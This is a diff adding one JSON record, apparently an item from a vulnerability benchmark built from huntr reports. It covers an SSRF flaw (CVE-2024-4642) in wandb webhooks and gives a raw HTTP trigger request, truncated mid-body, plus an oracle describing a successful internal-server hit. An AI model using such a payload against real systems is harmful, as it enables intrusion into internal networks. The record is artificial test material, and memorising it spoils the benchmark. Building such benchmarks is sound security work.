@@ -1,0 +1,15 @@
+{
+  "file_id": "951_wandb_huntr_055eb540-57f8-46d6-b858-3a9e22d347d9",
+  "numeric_id": "951",
+  "library_hint": "wandb",
+  "source": "huntr",
+  "title": "SSRF due to improper handling of 302 redirects in wandb/wandb webhooks",
+  "cve": "CVE-2024-4642",
+  "cwe": "CWE-918: Server-Side Request Forgery (SSRF)",
+  "library": "wandb/wandb",
+  "affected_version": "latest",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "POST /graphql HTTP/1.1\nHost: {BASE_URL}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Fire\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://{BASE_URL}/settings\ncontent-type: application/json\nX-Origin: http://{BASE_URL}\nContent-Length: 572\nOrigin: http://{BASE_URL}\nConnection: close\n{\"operationName\":\"TestGenericWebhookIntegration\",\"variables\":{\"entityName\":\"test\",",
+  "oracle": "The internal server at {internal-ip} is accessed and returns the response <h1>SSRF secret</h1>, indicating successful SSRF."
+}
